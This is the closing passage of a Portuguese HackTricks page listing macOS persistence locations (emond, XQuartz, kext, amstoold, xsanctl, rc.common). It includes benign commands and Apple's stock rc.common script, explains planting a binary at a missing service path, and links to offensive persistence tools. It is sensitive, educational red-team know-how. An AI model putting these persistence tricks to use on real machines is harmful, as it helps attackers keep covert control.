StopService(){
rm /tmp/superservicestarted
}

RestartService(){
echo "Restarting"
}

RunService "$1"
```
{% endtab %}
{% endtabs %}

### emond

{% hint style="danger" %}
Não consigo encontrar esse componente no meu macOS, então para mais informações, verifique o writeup
{% endhint %}

Writeup: [https://theevilbit.github.io/beyond/beyond\_0023/](https://theevilbit.github.io/beyond/beyond\_0023/)

A Apple introduziu um mecanismo de registro chamado **emond**. Parece que nunca foi totalmente desenvolvido e o desenvolvimento pode ter sido **abandonado** pela Apple em favor de outros mecanismos, mas ele continua **disponível**.

Esse serviço pouco conhecido pode **não ser muito útil para um administrador de Mac**, mas para um ator de ameaça, uma razão muito boa seria usá-lo como um **mecanismo de persistência que a maioria dos administradores do macOS provavelmente não saberia** procurar. Detectar o uso malicioso do emond não deve ser difícil, pois o System LaunchDaemon para o serviço procura scripts para serem executados em apenas um local:
```bash
ls -l /private/var/db/emondClients
```
### ~~XQuartz~~

Writeup: [https://theevilbit.github.io/beyond/beyond\_0018/](https://theevilbit.github.io/beyond/beyond\_0018/)

#### Localização

* **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
* Requer privilégios de root
* **Gatilho**: Com XQuartz

#### Descrição e Exploração

XQuartz **não está mais instalado no macOS**, então se você quiser mais informações, verifique o writeup.

### ~~kext~~

{% hint style="danger" %}
É tão complicado instalar kext mesmo como root que não considerarei isso para escapar de sandboxes ou mesmo para persistência (a menos que você tenha um exploit)
{% endhint %}

#### Localização

Para instalar um KEXT como um item de inicialização, ele precisa ser **instalado em um dos seguintes locais**:

* `/System/Library/Extensions`
* Arquivos KEXT incorporados no sistema operacional OS X.
* `/Library/Extensions`
* Arquivos KEXT instalados por software de terceiros

Você pode listar os arquivos kext atualmente carregados com:
```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
```
Para obter mais informações sobre [**extensões de kernel, verifique esta seção**](macos-security-and-privilege-escalation/mac-os-architecture#i-o-kit-drivers).

### ~~amstoold~~

Descrição: [https://theevilbit.github.io/beyond/beyond\_0029/](https://theevilbit.github.io/beyond/beyond\_0029/)

#### Localização

* **`/usr/local/bin/amstoold`**
* Requer privilégios de root

#### Descrição e exploração

Aparentemente, o `plist` de `/System/Library/LaunchAgents/com.apple.amstoold.plist` estava usando esse binário enquanto expunha um serviço XPC... o problema é que o binário não existia, então você poderia colocar algo lá e quando o serviço XPC fosse chamado, seu binário seria executado.

Não consigo mais encontrar isso no meu macOS.

### ~~xsanctl~~

Descrição: [https://theevilbit.github.io/beyond/beyond\_0015/](https://theevilbit.github.io/beyond/beyond\_0015/)

#### Localização

* **`/Library/Preferences/Xsan/.xsanrc`**
* Requer privilégios de root
* **Gatilho**: Quando o serviço é executado (raramente)

#### Descrição e exploração

Aparentemente, não é muito comum executar esse script e nem mesmo consegui encontrá-lo no meu macOS, então se você quiser mais informações, verifique o writeup.

### ~~/etc/rc.common~~

{% hint style="danger" %}
**Isso não funciona nas versões modernas do MacOS**
{% endhint %}

Também é possível colocar aqui **comandos que serão executados na inicialização**. Exemplo de script rc.common regular:
```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
local test

if [ -z "${NETWORKUP:=}" ]; then
test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
if [ "${test}" -gt 0 ]; then
NETWORKUP="-YES-"
else
NETWORKUP="-NO-"
fi
fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
local program="$1"
local pidfile="${PIDFILE:=/var/run/${program}.pid}"
local     pid=""

if [ -f "${pidfile}" ]; then
pid=$(head -1 "${pidfile}")
if ! kill -0 "${pid}" 2> /dev/null; then
echo "Bad pid file $pidfile; deleting."
pid=""
rm -f "${pidfile}"
fi
fi

if [ -n "${pid}" ]; then
echo "${pid}"
return 0
else
return 1
fi
}

#
# Generic action handler
#
RunService ()
{
case $1 in
start  ) StartService   ;;
stop   ) StopService    ;;
restart) RestartService ;;
*      ) echo "$0: unknown argument: $1";;
esac
}
```
## Técnicas e ferramentas de persistência

* [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
* [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de cibersegurança**? Gostaria de ver sua **empresa anunciada no HackTricks**? Ou gostaria de ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo Telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e o** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
